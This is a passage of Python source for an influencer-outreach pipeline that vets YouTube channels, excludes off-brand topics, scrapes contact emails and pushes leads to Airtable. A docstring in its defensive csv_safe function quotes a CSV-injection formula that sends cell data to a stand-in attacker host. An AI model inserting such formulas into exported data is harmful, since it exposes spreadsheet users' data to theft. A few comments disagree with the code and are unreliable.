"""
Orchestrates the full channel vetting pipeline, per niche:

  run_discovery() -> pre-filter against that niche's existing Airtable
  channel IDs -> for each remaining candidate: enrich -> score -> push
  to that niche's Airtable table

Run with --test to sanity-check the whole pipeline cheaply (1 keyword,
5 results, first niche only) before spending real quota on a full run.
"""
import argparse
import logging
import re
import sys
import time

# Channel titles can contain characters outside Windows' default console
# codepage (cp1252) — without this, printing one crashes the whole run
# partway through with UnicodeEncodeError.
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from discovery import run_discovery
from enrichment import (
    get_channel_stats,
    get_recent_video_performance,
    calc_upload_frequency,
    channel_age_months,
    days_since_last_upload,
    scan_older_videos_for_email,
    count_longform_in_older_videos,
)
from scoring import calc_fake_follower_risk, calc_overall_score, QUALIFIED, qualify
from search_zones import country_code, region_from_language_tag, zone_verdict
from airtable_client import (
    get_existing_channel_ids,
    push_record,
    AirtableReadError,
    count_added_today,
)
from external_dedupe import fetch_external_handles
from prospect_day import today_iso
from quota_tracker import get_today_spend
from browser_email import BrowserEmailScraper, null_scraper
from influencers import InfluencersClient, null_client
from influencer_discovery import InfluencerDiscovery
from do_not_contact import BlocklistUnavailable, fetch_blocklist
from config import (
    API_SLEEP_SECONDS,
    DEFAULT_STATUS,
    SOURCE_LABEL,
    DAILY_QUOTA_BUDGET,
    AIRTABLE_TABLE_HOME_THEATER,
    AIRTABLE_TABLE_LIFESTYLE_SOFA,
    CANDIDATE_OVERSHOOT,
    DAILY_FLAGGED_CAP,
    DAILY_QUALIFIED_CAP,
    DISCOVERY_DAYS_BACK,
    EXPECTED_CANDIDATES_PER_KEYWORD,
    INFLUENCERS_MAX_EXCLUDE_HANDLES,
    USE_PLAYWRIGHT_STEALTH,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# One entry per niche: its search keywords (drawn directly from the
# "Types of Content Posting" > Primary section of each influencer
# profiling brief, Cynthia Lim, updated 15 April 2024 — i.e. actual video
# topics target creators publish, not demographic/psychographic traits,
# those aren't searchable YouTube content) and which Airtable table its
# discovered channels get pushed to. Re-tune keywords as new briefs come
# in or results drift off-niche.
NICHES = {
    "Home Theater": {
        "keywords": [
            "home theater products review",
            "man cave tour",
            "entertainment room makeover",
            "car and truck review",
            "power tools review",
            "sports podcast commentary",
            "movie review and reaction",
            "home theater tech setup",
            "homesteading vlog",
        ],
        "table_name": AIRTABLE_TABLE_HOME_THEATER,
        # From the Home Theater brief (Cynthia Lim, 15 April 2024):
        # "Has a Min 10k+ views on YouTube" and "Not a new channel".
        # The 10,000 figure is now the floor BOTH niches run on, so this
        # entry is unchanged by the 2026-08 criteria change — it is the one
        # the other niche moved to. The threshold stays per-niche rather
        # than becoming a shared constant so a niche can be given its own
        # bar again without unpicking the gate.
        "min_avg_views": 10_000,
        "min_channel_age_months": 12,
        # influencers.club discovery filters (the source that replaces
        # search.list when INFLUENCERS_API_KEY is set — see run_niche). The
        # products being promoted are home-theatre gear, so the creators worth
        # reaching are: theatre enthusiasts (home cinema / AV / media rooms),
        # homebodies (people who build their nights-in around home
        # entertainment), and furniture enthusiasts (media-/living-room
        # furnishing). Relevance is carried by the ai_search SEMANTIC query,
        # not by `topics`: the yt-topics taxonomy has no leaf for "home" or
        # "furniture", and pinning topics to Movies/Technology would EXCLUDE
        # the furniture/homebody creators (YouTube files them under Lifestyle).
        # Reword ai_search to steer the niche; it is a 3–150 char free-text
        # field verified live 2026-08-13.
        #
        # gender="male": the primary target for home-theatre products is men.
        # This is the CREATOR's gender, filtered server-side (accepted values
        # verified live: 'any' | 'male' | 'female'). There is also a separate
        # audience.gender filter (target creators whose AUDIENCE skews male) if
        # audience composition ever matters more than the creator's own gender.
        "discovery_filters": {
            "profile_language": ["en"],
            "gender": "male",
            "ai_search": (
                "home theater and home cinema setups, media rooms, cozy homebody "
                "home entertainment, living room furniture and home furnishing"
            ),
            "number_of_subscribers": {"min": 2000},
            # A server-side "keywords_not_in_description" negation of the
            # off-brand political / ASMR / firearms terms is wired in from
            # EXCLUDED_TOPIC_TERMS after that dict is defined (it lives below
            # this literal) — see EXCLUDED_TOPIC_KEYWORDS.
        },
    },
    "Lifestyle Sofa": {
        "keywords": [
            "interior design and styling",
            "home decor tour",
            "DIY home makeover",
            "day in the life stay at home mom",
            "home cleaning and organizing",
            "furniture review unboxing",
            "cozy living room decor",
            "country living home",
            "minimalist home living",
            "house tour apartment tour",
            "seasonal home decor",
        ],
        "table_name": AIRTABLE_TABLE_LIFESTYLE_SOFA,
        # RAISED from the brief's 2,000 to 10,000 in the 2026-08 criteria
        # change, which put both niches on the same view floor. The brief
        # (Cynthia Lim, 15 April 2024) says "Has min of 2k+ view on YouTube
        # videos" — this deliberately overrides it, so don't "restore" the
        # 2,000 from the brief without checking that the instruction to
        # unify the two niches has actually been reversed.
        #
        # The brief sets no channel-age requirement, and that part still
        # stands. Its Instagram thresholds (100k+ followers, 20k+ reel
        # views) are out of scope — this pipeline only observes YouTube.
        "min_avg_views": 10_000,
        "min_channel_age_months": None,
        # Fashion, lifestyle, travel, house tours, and home decor — and
        # especially women-led channels. gender="female" filters the CREATOR
        # server-side (values verified live: 'any' | 'male' | 'female').
        # Relevance rides on ai_search rather than topics: "house tours" and
        # "home decor" have no yt-topics leaf, and pinning topics to the
        # Fashion/Tourism leaves that DO exist would exclude the decor /
        # house-tour creators. Reword ai_search to steer it.
        "discovery_filters": {
            "profile_language": ["en"],
            "gender": "female",
            "ai_search": "fashion and lifestyle vlogs, travel, house tours, home decor and interior styling",
            "number_of_subscribers": {"min": 2000},
            # As above: the off-brand "keywords_not_in_description" negation is
            # wired in from EXCLUDED_TOPIC_TERMS below — see
            # EXCLUDED_TOPIC_KEYWORDS.
        },
    },
}

# Outer refill-round cap for the influencers.club discovery loop. discovery
# paginates internally and stops when supply or its credit ceiling runs out;
# this only backstops a pathological run where a very low gate-survival rate
# would otherwise keep asking for more candidates round after round.
DISCOVERY_MAX_ROUNDS = 50

# Niche match currently defaults to a neutral midpoint (50/100) since
# automated topical matching isn't implemented yet — human reviewers can
# override the "Overall Score" judgment during Airtable review. Wire in a
# real niche classifier here if/when one becomes available.
DEFAULT_NICHE_MATCH = 70.0


# One label per step of the chain below. backfill_missing_emails.py
# aggregates these to report which step actually moved email coverage,
# so they must stay distinct.
EMAIL_SOURCE_REPEATED = "repeated across recent videos"
EMAIL_SOURCE_ABOUT = "About description"
EMAIL_SOURCE_OLDER = "repeated across older videos"
EMAIL_SOURCE_INFLUENCERS = "influencers.club enrichment"
EMAIL_SOURCE_BROWSER = "linked site or its /contact page (Playwright)"


# --- Pre-push gate -------------------------------------------------------
# The ONE place this pipeline discards a candidate outright instead of
# flagging it for review. Everything else follows the flag-never-discard
# rule; these cases are exceptions because a human reviewing them is pure
# cost.
#
# The 2026-08 criteria change moved the view floor in here. It used to
# produce a "Below View Minimum" row for a reviewer to dismiss; it is now
# a hard requirement, so an under-view channel is discarded and that
# Qualification value no longer exists (see scoring.py). Two more hard
# requirements landed with it: a minimum video count, and the search-zone
# check below.
#
# Dead channels: both measures have to be dead, not either. In the live
# Home Theater table five rows were burning flagged budget at 0-281 subs
# and 0-38 avg views, while the lowest legitimate Qualified channel sat at
# 2,400 subs / 16,160 views — so 100/100 clears the junk with two orders of
# magnitude to spare. Requiring BOTH keeps a small-but-growing channel
# (few subs, real views) and a fading big one (many subs, few views) in the
# table where a reviewer can see them.
#
# That gate is now mostly redundant against a 10,000-view floor, and is
# kept anyway: it is the floor that holds if a niche's own min_avg_views is
# ever lowered, and it is the only one of the two that reads subscribers.
JUNK_MIN_SUBSCRIBERS = 100
JUNK_MIN_AVG_VIEWS = 100

# A published track record, applied to BOTH niches. Read from
# channels.list statistics.videoCount, i.e. the channel's whole public
# catalogue, not the 10-video performance window or the 50-video email
# scan. Deliberately a FLOOR with no upper bound: "30-40 videos" describes
# the smallest catalogue worth approaching, and a channel with 400 uploads
# clears that bar rather than failing it.
MIN_VIDEO_COUNT = 30

# The same 30-video floor, but counting only videos confirmed NOT to be
# Shorts. MIN_VIDEO_COUNT above reads statistics.videoCount, which lumps
# Shorts in with everything else — so a channel with 300 Shorts and 4
# long-form uploads cleared it, which is not what "30-40 videos minimum"
# means for a brand looking to place a product in real content.
#
# is_shorts_only() does NOT cover this: it discards only channels that are
# 100% Shorts, so the entire middle ground (a Shorts factory that posts the
# occasional long-form video) passed both checks. Measured on 47 otherwise-
# qualifying Home Theater candidates, 12 had fewer than 10 long-form videos
# in their newest 50 and were being written as prospects.
#
# Confirmed against up to ~200 videos — the newest 50 from enrichment plus
# LONGFORM_SCAN_MAX_PAGES more — see enrichment.count_longform_in_older_videos.
MIN_LONGFORM_VIDEO_COUNT = 30

# Content language must be English. The tag is the channel's own
# defaultAudioLanguage/defaultLanguage, reduced to the most common value
# across the sampled videos by enrichment.dominant_language().
#
# Matched on the "en" PREFIX, so en, en-US, en-GB and en-AU all pass: the
# region subtag is not noise to be normalised away — main.resolve_country()
# reads it to place channels that declare no country, which is the only
# search-zone signal available for ~15% of candidates. Stripping it to a bare
# "en" would silently blind the zone filter for exactly those channels.
ENGLISH_LANGUAGE_PREFIX = "en"

# Every video in the newest-10 performance window must clear this, applied to
# BOTH niches. This is the per-video reading of "min 10k+ views" — STRICTER
# than the niche's min_avg_views floor, which one strong upload can carry over
# the line while other recent videos flopped. Gated on the window's MINIMUM
# (enrichment's "min_views"), so it means "every recent video passed 10k", not
# "the average did". Kept alongside min_avg_views, not replacing it, so a niche
# can still be given its own average bar.
MIN_VIEWS_PER_VIDEO = 10_000

# A live channel, applied to BOTH niches: at least this many uploads per year,
# read from the sampled window's cadence (enrichment.calc_upload_frequency,
# videos/month, annualised). A slower channel isn't publishing often enough to
# be worth a placement. Unknown cadence (fewer than two sampled uploads) is
# passed as None and never disqualifies, the same rule as an unknown age.
MIN_UPLOADS_PER_YEAR = 10

# Still-active: the most recent sampled upload must be within this many days
# (a rolling ~12 months from today, NOT the calendar year). A channel that
# went quiet a year ago is not one to approach, however strong its back
# catalogue. An unknown last-upload date (nothing parseable in the window) is
# passed as None and never disqualifies.
MAX_DAYS_SINCE_LAST_UPLOAD = 365

DROP_DEAD_CHANNEL = "dead_channel"
DROP_SHORTS_ONLY = "shorts_only"
DROP_BELOW_VIEW_MINIMUM = "below_view_minimum"
DROP_VIDEO_BELOW_VIEW_MINIMUM = "video_below_view_minimum"
DROP_TOO_FEW_VIDEOS = "too_few_videos"
DROP_TOO_FEW_LONGFORM = "too_few_longform_videos"
DROP_NOT_ENGLISH = "not_english"
DROP_OUTSIDE_SEARCH_ZONE = "outside_search_zone"
DROP_EXCLUDED_TOPIC = "excluded_topic"
DROP_UPLOAD_CADENCE_TOO_LOW = "upload_cadence_too_low"
DROP_STALE_CHANNEL = "stale_channel"

# Whole categories a brand-partnership run must never surface, however well a
# channel otherwise fits a niche: political commentary, ASMR, and firearms /
# gun-review content. Discarded outright like the gates above (not flagged) —
# the brief rules them out, so a human reviewing them is pure cost.
#
# Matched as WHOLE WORDS (case-insensitive) against the channel's OWN title
# and About description only — its self-identification — never its video
# descriptions, which would drag in false positives (a home-theater channel
# reviewing a war film; a decor channel styling a "campaign" desk).
#
# The term lists are deliberately tuned against THIS pipeline's two niches,
# where the obvious words are landmines:
#   - firearms omits bare "gun"/"shotgun"/"shooting" ("nail/glue/spray gun"
#     are DIY/furniture vocabulary; "shotgun" is a home-theater MICROPHONE),
#     AND omits "pistol"/"revolver"/"rifle": Home Theater is audiophile-
#     adjacent and Lifestyle Sofa covers fashion/thrift, so those collide
#     with the Sex Pistols, the Beatles' "Revolver", and the verb "rifle
#     through". The remaining firearm-specific terms still catch a gun-review
#     channel, which will carry firearm/handgun/ammo/AR-15/glock/etc.
#   - political omits "conservative"/"liberal" (everyday decor/design
#     adjectives: "a conservative palette", "liberal use of throw pillows")
#     and "parliament" (the funk band Parliament-Funkadelic).
# Over-excluding costs one lead; under-excluding lets a banned category
# through. Tune the sets if a real prospect is ever wrongly dropped.
EXCLUDED_TOPIC_TERMS = {
    "political": [
        "politics", "political", "geopolitics", "election", "elections",
        "democrat", "democrats", "republican", "republicans", "libertarian",
        "leftist", "left-wing", "right-wing", "congress", "senate",
        "communism", "socialism", "MAGA",
    ],
    "asmr": ["asmr", "tingles", "mouth sounds"],
    "firearms": [
        "firearm", "firearms", "handgun", "handguns", "ammo", "ammunition",
        "AR-15", "AK-47", "glock", "concealed carry", "second amendment",
        "gunsmith", "ballistics",
    ],
}

# The same off-brand terms, flattened for influencers.club discovery's
# SERVER-SIDE negation filter (see the wiring loop below). Sent as the
# vendor's `keywords_not_in_description`, which withholds any creator whose
# profile bio carries one of these words/phrases — so the whole political /
# ASMR / firearms categories are never RETURNED, and (at 0.01 credits per
# returned creator) never BILLED. This is the credit-saving move
# exclude_handles already makes for already-known creators: filtering these
# out locally after the response, the way excluded_topic_reason() does, cannot
# refund the discovery credit the vendor has already charged.
#
# Reuses EXCLUDED_TOPIC_TERMS verbatim rather than a hand-kept copy, so the
# server pre-filter and the local backstop can never drift. Safe to reuse
# because the vendor field matches the SAME way the local gate does — case-
# insensitive, on whole words and multi-word phrases (verified live
# 2026-08-14, the way gender's accepted values were: a wrong-type probe
# names the field, and keywords_in/keywords_not partition the result set
# exactly — P + N == base total). So the landmine words that gate deliberately
# omits ("gun"/"rifle"/"conservative"/…) stay omitted here too; "MAGA" does
# not match "magazine".
EXCLUDED_TOPIC_KEYWORDS = sorted(
    {term for terms in EXCLUDED_TOPIC_TERMS.values() for term in terms}
)

# Wire that negation into every niche that runs discovery. Done here, after
# both NICHES and EXCLUDED_TOPIC_TERMS exist, rather than inline in the NICHES
# literal above — which is defined before EXCLUDED_TOPIC_TERMS. Guarded on
# presence so a future niche without discovery_filters (search.list only) is
# left untouched rather than KeyError-ing at import.
#
# The local excluded_topic_reason() gate in process_candidate STAYS as the
# deterministic backstop: it also reads the channel TITLE (not just the bio),
# and it is the only tier that covers the search.list fallback path this
# server-side filter never touches.
for _niche_config in NICHES.values():
    _discovery_filters = _niche_config.get("discovery_filters")
    if _discovery_filters is not None:
        # A per-niche list() copy, not the shared constant itself: each niche
        # owns its own list, so a future per-niche exclusion edit can't mutate
        # the other niche's filter (or EXCLUDED_TOPIC_KEYWORDS) in place. The
        # copies are still all derived from EXCLUDED_TOPIC_TERMS at import, so
        # the no-drift guarantee above is unaffected.
        _discovery_filters["keywords_not_in_description"] = list(EXCLUDED_TOPIC_KEYWORDS)
# Don't leak the loop's throwaway names into the module namespace (this is the
# file's only top-level for-loop; the comprehensions around it leak nothing).
del _niche_config, _discovery_filters


# One pattern per category, matching any listed term on a word boundary.
# Compiled once at import, not per candidate.
_EXCLUDED_TOPIC_PATTERNS = {
    category: re.compile(
        r"\b(?:" + "|".join(re.escape(term) for term in terms) + r")\b",
        re.IGNORECASE,
    )
    for category, terms in EXCLUDED_TOPIC_TERMS.items()
}


def excluded_topic_reason(*texts: str) -> str | None:
    """
    The first excluded category ('political' | 'asmr' | 'firearms') whose
    terms appear in `texts`, or None. Free — reads only data already fetched
    (the channel title and About description).
    """
    blob = " ".join(t for t in texts if t)
    for category, pattern in _EXCLUDED_TOPIC_PATTERNS.items():
        if pattern.search(blob):
            return category
    return None


def is_english(content_language: str | None) -> bool:
    """
    Whether a content-language tag is English.

    An UNSET tag is not English here — a deliberate break from this
    pipeline's usual "absent data never disqualifies" rule (unknown channel
    age, unknown country). The requirement is that every row's Content
    Language reads as English, and a blank cannot satisfy it; keeping unsets
    would put "Unknown" rows in a table specified to hold English channels.

    The cost of the strict reading was measured before choosing it: across
    197 enriched candidates, ZERO of the 47 that passed every other gate had
    an unset language, because dominant_language() reads the whole 50-video
    window rather than one video. So this discards essentially nothing today
    — but it is the strict direction, and if a future sample does carry
    unsets they will be dropped rather than written as Unknown.
    """
    return (content_language or "").strip().lower().startswith(ENGLISH_LANGUAGE_PREFIX)


def pre_push_drop_reason(
    subscriber_count: int | None,
    avg_views: float | None,
    shorts_only: bool = False,
    min_avg_views: float = 0,
    video_count: int | None = None,
    content_language: str | None = None,
    min_views: int | None = None,
    uploads_per_year: float | None = None,
    days_since_last_upload: float | None = None,
) -> str | None:
    """
    Why this candidate should never reach Airtable, or None to continue.

    Applies regardless of what qualify() would have returned — a row for a
    dead channel is exactly the row this gate exists to stop writing.

    Deliberately does NOT cover the search zone, nor the long-form video
    floor. Both need data this function can't get for free — a country
    (see resolve_country) and up to three extra pages of uploads (see
    longform_drop_reason) — so they run as their own steps in
    process_candidate, AFTER everything here. Everything in this function is
    answerable from data already fetched, which is what makes it the cheapest
    place to discard.

    Unknown data never disqualifies, the same rule qualify() follows: a
    `video_count` of None means channels.list didn't report one, and an
    unreported catalogue size is not evidence of a small catalogue. A
    reported 0 is a real answer and is failed like any other number below
    the floor. The ONE exception is `content_language` — see is_english() for
    why an unset language is treated as a failure there.

    `content_language` defaults to None, which fails the English check. That
    default is deliberate: a caller that forgets to pass it gets a loud
    empty result rather than silently skipping the gate.

    `min_views`, `uploads_per_year` and `days_since_last_upload` are the three
    activity/quality floors (each of the newest 10 videos over 10k, at least
    10 uploads a year, a last upload inside a rolling 12 months). They follow
    the video_count rule, NOT the content_language one: each defaults to None
    and a None never disqualifies, because "we couldn't measure it" (an empty
    window, fewer than two dated uploads, no parseable timestamp) is not
    evidence against the channel. process_candidate supplies real values.
    """
    if shorts_only:
        return DROP_SHORTS_ONLY
    if not is_english(content_language):
        return DROP_NOT_ENGLISH
    if video_count is not None and video_count < MIN_VIDEO_COUNT:
        return DROP_TOO_FEW_VIDEOS
    if (avg_views or 0) < min_avg_views:
        return DROP_BELOW_VIEW_MINIMUM
    # The per-video floor sits right after the niche's own average floor: both
    # are "views" criteria, and reporting the niche's own bar first keeps the
    # log reading in the reviewer's terms.
    if min_views is not None and min_views < MIN_VIEWS_PER_VIDEO:
        return DROP_VIDEO_BELOW_VIEW_MINIMUM
    if uploads_per_year is not None and uploads_per_year < MIN_UPLOADS_PER_YEAR:
        return DROP_UPLOAD_CADENCE_TOO_LOW
    if days_since_last_upload is not None and days_since_last_upload > MAX_DAYS_SINCE_LAST_UPLOAD:
        return DROP_STALE_CHANNEL
    if (subscriber_count or 0) < JUNK_MIN_SUBSCRIBERS and (avg_views or 0) < JUNK_MIN_AVG_VIEWS:
        return DROP_DEAD_CHANNEL
    return None


def longform_drop_reason(longform_count: int) -> str | None:
    """
    Whether the channel showed MIN_LONGFORM_VIDEO_COUNT confirmed non-Shorts
    uploads, or None to continue.

    Split out from pre_push_drop_reason because establishing the count can
    cost quota (see enrichment.count_longform_in_older_videos), so it must
    run after every free check has had its chance to discard the candidate.

    Unlike `video_count`, a shortfall here IS a failure even though the data
    is partial. That is the point: a channel gets ~200 videos' worth of
    chances to show 30 long-form uploads, and not showing them is the
    evidence, not missing data.
    """
    if longform_count < MIN_LONGFORM_VIDEO_COUNT:
        return DROP_TOO_FEW_LONGFORM
    return None


def resolve_country(stats: dict, performance: dict) -> str:
    """
    Where the channel says it is, or "" when it says nothing.

      1. `channels.list` -> snippet.country, an ISO 3166-1 alpha-2 code.
         85% of the channels in the live tables set it (29 of 34).
      2. The REGION SUBTAG of the content language ("en-GB" -> GB), for
         the rest. Free — `get_recent_video_performance()` already read
         `defaultAudioLanguage` for the "Content Language" column.

    Both steps are free, so this can run for every surviving candidate.

    Step 2 is a weak signal used only where step 1 is silent, never to
    override it: measured on the live tables the language tag disagrees
    with the declared country for 4 of the 29 channels that have one
    (`en-US` content from India, Austria and Serbia; `fr-FR` from the US).
    A bare language with no region subtag yields nothing at all — see
    search_zones.region_from_language_tag.

    There is deliberately no browser step here. See browser_email.py: the
    About panel's country is the same field as snippet.country, so it
    recovered 0 of the 5 live channels that lack one.
    """
    country = (stats.get("country") or "").strip()
    if country_code(country):
        return country

    return region_from_language_tag(performance.get("content_language"))


def resolve_email_with_source(
    stats: dict, performance: dict, scraper=None, enricher=None
) -> tuple[str, str]:
    """
    Email fallback chain, cheapest and strongest signal first, returning
    (email, source_label) — or ("", "") when no step found anything:

      1. An address repeated across several recent video descriptions.
      2. A single mention in the channel's own About description.
      3. The same repeat test, extended over OLDER uploads.
      4. influencers.club's enrich-by-handle endpoint, keyed on channel ID.
      5. The channel's public external link list, followed in Playwright:
         each non-third-party link, then its /contact page.

    Steps 1-2 use data already fetched during enrichment and cost
    nothing. Step 3 costs 2 quota units per extra page and only runs when
    1-2 found nothing, so channels whose address is already known never
    trigger it.

    Step 4 precedes step 5 on cost, not on signal quality, and step 5 stays
    last because it reads the creator's OWN site — a different source
    rather than a worse one. influencers.py's module docstring carries that
    argument in full; don't restate it here, or the two drift.

    Step 5 reads the LINK LIST, not the About text — step 2 already has
    the full About description from channels.list, so re-reading it in a
    browser could never add an address. See browser_email.py.

    Reporting the source here is what lets callers attribute a hit to a
    step. Comparing the result back against stats/performance can't: steps
    3, 4 and 5 are indistinguishable that way.
    """
    email = performance.get("repeated_email")
    if email:
        return email, EMAIL_SOURCE_REPEATED

    email = stats.get("business_email", "")
    if email:
        return email, EMAIL_SOURCE_ABOUT

    email = scan_older_videos_for_email(
        stats["channel_id"],
        stats.get("uploads_playlist_id", ""),
        performance.get("next_page_token", ""),
        performance.get("video_descriptions", []),
    )
    if email:
        return email, EMAIL_SOURCE_OLDER

    # Both collaborators ship a null object precisely so "absent" is an
    # object that returns "". Normalising here keeps that as the ONE
    # soft-disable mechanism — an `if x is not None` guard per step would
    # be a second one doing the same job, and the two could disagree.
    if enricher is None:
        enricher = null_client()
    if scraper is None:
        scraper = null_scraper()

    email = enricher.find_email(stats["channel_id"])
    if email:
        return email, EMAIL_SOURCE_INFLUENCERS

    email = scraper.find_email(stats["channel_id"])
    if email:
        return email, EMAIL_SOURCE_BROWSER

    return "", ""


def resolve_email(stats: dict, performance: dict, scraper=None, enricher=None) -> str:
    """The chain above, for callers that only need the address itself."""
    return resolve_email_with_source(stats, performance, scraper, enricher)[0]


def push_until_full(
    candidates: list[dict],
    build_record,
    table_name: str,
    qualified_headroom: int,
    flagged_headroom: int = 0,
) -> dict:
    """
    Push candidates until both daily budgets are exhausted or the
    candidates run out.

    `build_record(candidate)` returns `(record, qualification)`, or
    `(None, reason)` to skip the candidate without spending budget.

    Only SUCCESSFUL pushes consume budget. The previous loop counted
    attempts, so a run of Airtable failures would have burned the day's
    allowance without writing anything.

    Returns counts plus "pushed_ids", the Channel IDs actually written —
    matching the original loop, which added to newly_tracked_ids only
    when push_record returned True.
    """
    counts = {"qualified": 0, "flagged": 0, "skipped": 0, "pushed_ids": set()}

    for candidate in candidates:
        if counts["qualified"] >= qualified_headroom and counts["flagged"] >= flagged_headroom:
            logger.info("Both daily budgets are full — stopping this niche.")
            break

        record, qualification = build_record(candidate)
        if record is None:
            counts["skipped"] += 1
            continue

        bucket = "qualified" if qualification == QUALIFIED else "flagged"
        headroom = qualified_headroom if bucket == "qualified" else flagged_headroom
        if counts[bucket] >= headroom:
            counts["skipped"] += 1
            continue

        if push_record(table_name, record):
            counts[bucket] += 1
            counts["pushed_ids"].add(record["Channel ID"])
        # A failed push is logged inside push_record and costs no budget.

    return counts


# --- Spreadsheet safety for reviewer-facing text -------------------------
# Characters that make a spreadsheet treat a cell's contents as a FORMULA
# rather than as text. The tab and CR are in here because a leading
# whitespace character is stripped by some importers before the formula
# check runs, which puts the "=" back at the front.
SPREADSHEET_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: str) -> str:
    """
    Neutralise a value that a spreadsheet would otherwise run as a formula.

    WHY this exists at all — it looks like a pointless prefix until you
    follow the value to where a human actually reads it:

      - Airtable is NOT a formula-eval context for these values, so nothing
        executes when the record is pushed. That is why this is easy to
        mistake for dead code and "clean up". Don't.
      - But this pipeline's entire purpose is to hand rows to a HUMAN
        reviewer, and the normal thing a reviewer does with an Airtable view
        is export it to CSV and open it in Excel or Google Sheets. THAT is a
        formula-eval context: a cell starting with =, +, -, @ or a leading
        tab/CR is parsed as a formula, not as text.
      - Two of the fields we write are attacker-influenced. "Channel Name"
        is whatever the channel owner typed, and "Email" can come out of
        browser_email.py, which reads arbitrary third-party websites. A
        channel named `=HYPERLINK("http://evil.tld?d="&A1,"click")` becomes
        a live payload in the reviewer's spreadsheet — classic CSV (formula)
        injection, and the reviewer's machine is the target, not ours.

    A leading apostrophe is the fix because it is what spreadsheets
    themselves use to mean "this cell is literal text": Excel and Sheets
    both consume it on import and display the original string.

    Deliberately conservative about what it touches:

      - Only the FIRST character is examined. "Bob's Home Theater" and
        `a-b@c.com` contain dangerous characters but cannot start a formula,
        and mangling ordinary channel names/addresses would make the field
        wrong for every honest candidate to defend against a rare one.
      - Non-strings (and empty strings/None) pass straight through with
        their type intact. Several record fields are genuinely numeric and
        Airtable's Number fields reject strings, so stringifying here would
        break the push for every record.
    """
    if not isinstance(value, str) or not value:
        return value
    if value[0] in SPREADSHEET_FORMULA_PREFIXES:
        return "'" + value
    return value


def process_candidate(
    candidate: dict,
    external_handles: dict[str, str],
    blocklist,
    niche_config: dict,
    scraper,
    enricher=None,
    known_channel_ids: set[str] | None = None,
) -> tuple[dict | None, str]:
    """Enrich, screen, qualify, and build an Airtable record for one candidate."""
    known_channel_ids = known_channel_ids or set()
    # A candidate carries EITHER a "channel_id" (discovery.py / YouTube search)
    # OR a "handle" (influencer_discovery.py, which surfaces creators by
    # @handle). get_channel_stats resolves the real UC… id off the response
    # either way, so everything below is keyed on the resolved id.
    channel_id = candidate.get("channel_id")
    cand_handle = candidate.get("handle")

    # Checkpoint 1 — free, before spending ~3 quota units on enrichment.
    hit = blocklist.match(name=candidate.get("channel_title", ""))
    if hit:
        logger.info("BLOCKED (pre-enrichment) %s — DO NOT CONTACT (%s).", candidate.get("channel_title"), hit)
        return None, "blocked"

    stats = get_channel_stats(channel_id) if channel_id else get_channel_stats(handle=cand_handle)
    time.sleep(API_SLEEP_SECONDS)
    if stats is None:
        return None, "unreachable"
    # From here on channel_id is the RESOLVED id: the input for a search
    # candidate, the forHandle lookup's result for a discovery candidate.
    channel_id = stats.get("channel_id")
    if not channel_id:
        logger.info("No channel ID resolved for %s — skipping.", cand_handle or "candidate")
        return None, "unreachable"

    # Checkpoint 2 — the reliable key, known only after channels.list.
    hit = blocklist.match(handle=stats.get("handle", ""), name=stats.get("channel_title", ""))
    if hit:
        logger.info("BLOCKED %s — DO NOT CONTACT (%s).", stats.get("channel_title"), hit)
        return None, "blocked"

    # Skip channels already tracked in the base's other YouTube outreach/
    # leads/influencer tables (see external_dedupe.py) — checked here
    # rather than pre-discovery, since we only know a candidate's @handle
    # once channels.list has already run.
    handle = stats.get("handle", "")
    if handle and handle in external_handles:
        logger.info(
            "Skipping %s — already tracked in '%s' (@%s).",
            stats.get("channel_title"), external_handles[handle], handle,
        )
        return None, "duplicate"

    # Niche-table dedupe by the RESOLVED channel ID. run_niche pre-filters
    # search.list candidates by channel_id before this runs, but discovery
    # candidates arrive as @handles with no id, so this is the only place one
    # already tracked in THIS niche's table is caught. It costs the 1-unit
    # channels.list already spent above; the server-side exclude_handles is
    # what avoids even that once tracked handles are persisted.
    if channel_id in known_channel_ids:
        logger.info(
            "Skipping %s — already tracked in this niche's table.", stats.get("channel_title"),
        )
        return None, "duplicate"

    # Off-brand topic exclusion (political / ASMR / firearms). Reads the title
    # and About description already fetched, and runs BEFORE
    # get_recent_video_performance so an excluded channel skips the
    # performance / longform / email quota below. It is a post-response
    # BACKSTOP, not a cost-free filter: the channels.list unit above is already
    # spent by here, and on the discovery path the creator's 0.01 discovery
    # credit was already billed when the vendor returned it. Saving THOSE would
    # need a server-side negation filter in discovery_filters — a follow-up,
    # and only after the vendor's bio-negation field is verified live the way
    # gender/topics were — the same reason exclude_handles exists. This local
    # gate stays regardless: it is the only tier that also covers the
    # search.list fallback, and it is deterministic across both paths.
    topic = excluded_topic_reason(stats.get("channel_title", ""), stats.get("description", ""))
    if topic:
        logger.info(
            "Dropping %s before push — %s (%s).",
            stats.get("channel_title"), DROP_EXCLUDED_TOPIC, topic,
        )
        return None, DROP_EXCLUDED_TOPIC

    performance = get_recent_video_performance(channel_id, stats.get("uploads_playlist_id"))
    time.sleep(API_SLEEP_SECONDS)
    if performance is None:
        logger.info("Skipping %s — no accessible recent video performance data.", stats.get("channel_title"))
        return None, "unreachable"

    # Activity/quality signals for the gate, all free from data already
    # fetched. upload_freq (videos/month over the sampled window) is computed
    # HERE, before the gate, so the cadence check can read it — and it is
    # reused unchanged for the Overall Score and the "Upload Frequency" column
    # below, never recomputed.
    upload_dates = performance.get("upload_dates", [])
    upload_freq = calc_upload_frequency(upload_dates)
    # None (not 0) when the window is too thin to estimate a cadence — fewer
    # than two dated uploads — so an unmeasurable channel isn't dropped on a
    # made-up zero. See pre_push_drop_reason's None rule.
    uploads_per_year = upload_freq * 12 if len(upload_dates) >= 2 else None
    days_since = days_since_last_upload(upload_dates)

    # Pre-push gate, placed before scoring and before the email chain so a
    # discarded candidate costs no browser session and no deep-scan quota.
    drop_reason = pre_push_drop_reason(
        stats.get("subscriber_count"),
        performance.get("avg_views"),
        performance.get("shorts_only", False),
        min_avg_views=niche_config["min_avg_views"],
        video_count=stats.get("video_count"),
        content_language=performance.get("content_language"),
        min_views=performance.get("min_views"),
        uploads_per_year=uploads_per_year,
        days_since_last_upload=days_since,
    )
    if drop_reason:
        logger.info(
            "Dropping %s before push — %s (%s subs, %s avg views, min %s, %s videos, "
            "%s uploads/yr, %s days since upload, lang %s).",
            stats.get("channel_title"), drop_reason,
            stats.get("subscriber_count"), round(performance.get("avg_views") or 0, 1),
            performance.get("min_views"), stats.get("video_count"),
